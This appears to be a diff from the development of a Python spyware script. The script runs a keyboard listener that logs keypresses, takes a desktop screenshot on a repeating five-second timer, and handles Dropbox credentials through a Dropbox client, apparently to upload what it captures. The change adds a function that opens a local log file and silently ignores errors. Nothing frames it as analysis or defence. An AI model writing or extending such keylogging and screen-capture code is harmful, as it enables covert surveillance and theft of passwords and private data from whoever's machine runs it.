@@ -10,6 +10,7 @@ import logging
 dbx = dropbox.Dropbox('')
 
 def main():
+    create_log_file()
     threading.Timer(5.0, main).start()
     image = grab_desktop_image()
     get_dropbox_credentials()
@@ -32,6 +33,11 @@ def logger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
+def create_log_file():
+    try:
+        f = open("log.txt", "a")
+    except:
+        print('')
 
 def remove_image(image):
     try:
